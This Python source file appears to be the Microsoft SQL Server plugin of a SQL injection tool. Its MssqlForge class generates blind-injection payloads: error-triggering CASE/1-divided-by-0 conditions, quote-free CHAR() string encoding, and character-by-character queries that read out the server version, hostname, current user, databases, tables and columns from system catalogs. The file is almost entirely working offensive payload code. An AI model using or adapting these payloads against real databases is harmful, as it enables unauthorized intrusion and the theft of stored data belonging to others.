from ..core.plugin import *
from ..core.forge import SQLForge

class MssqlForge(SQLForge):
	def __init__(self, context):
		SQLForge.__init__(self, context)
		
	"""
	Define overrides
	"""

	def wrapMid(self, cdt):
		#return self.wrapSQL('IF(%s) SELECT %s ELSE SELECT 1/0' % (cdt,self.wrapField('0')))
		return self.wrapSQL('SELECT CASE WHEN %s THEN %s ELSE 1/0 END' % (cdt,self.wrapField('0')))

	def wrapString(self, string):
		out = '('
		for car in string:
			out += 'CHAR(%d)+' % ord(car)
		out = out[:-1]+')'
		return out
	
	def stringLen(self, string):
		return 'SELECT LEN(%s)' % string
	
		
	############################################
	# VERSION
	############################################

	def getVersion(self):
		return '@@VERSION'

	def getHostname(self):
		return 'HOST_NAME()'


	############################################
	# DATABASES
	############################################
	
	def getCurrentDatabase(self):
		return 'DB_NAME()'

	def getDatabases(self):
		return 'SELECT name FROM master..sysdatabases'

	
	############################################
	# TABLES
	############################################
	
	def getTables(self,db):
		return 'SELECT name FROM %s..sysobjects WHERE xtype= %s' % (db,self.wrapString('U'))
	
	def getTableLen(self,id,db):
		return "SELECT TOP 1 LEN(name) FROM (SELECT TOP %d name FROM %s..sysobjects WHERE xtype=%s ORDER BY name ASC) sq ORDER BY name DESC" % (id+1,db,self.wrapString('U'))
		
	def getTableChar(self, id, pos,db):
		return self.asciiCode(self.midChar("(SELECT TOP 1 name FROM (SELECT TOP %d name FROM %s..sysobjects WHERE xtype=%s ORDER BY name ASC) sq ORDER BY name DESC)" % (id+1,db,self.wrapString('U')),pos+1))

	def getUser(self):
		return 'user_name()'

	############################################
	# FIELDS
	############################################

	def getFields(self, table, db):
		return "SELECT name FROM %s..syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = %s)" % (db,self.wrapString(table))

	def getFieldLen(self,table,id, db):
		return "SELECT TOP 1 LEN(name) FROM (SELECT TOP %d name FROM %s..syscolumns WHERE id = (SELECT id FROM %s..sysobjects WHERE name = %s) ORDER BY name ASC) sq ORDER BY name DESC" % (id+1,db,db,self.wrapString(table))
		
	def getFieldChar(self, table, id, pos, db):
		return self.asciiCode(self.midChar("(SELECT TOP 1 name FROM (SELECT TOP %d name FROM %s..syscolumns WHERE id = (SELECT id FROM %s..sysobjects WHERE name = %s) ORDER BY name ASC) sq ORDER BY name DESC)" % (id+1,db,db,self.wrapString(table)),pos+1))

	def getStringLen(self,str):
		return "SELECT LEN(%s)" % str

	def getStringChar(self,str,pos):
		return "SELECT ASCII(SUBSTRING(%s,%d,1))" % (str,pos+1)


@plugin('mssql','Microsoft SQL Server')
@allow(DBS_ENUM | TABLES_ENUM | COLS_ENUM | FIELDS_ENUM | COMMENT | STR)
class Mssql(Plugin):	
	def __init__(self, context, injector, limit_count_max=500):
		Plugin.__init__(self, MssqlForge, context, injector, limit_count_max)
		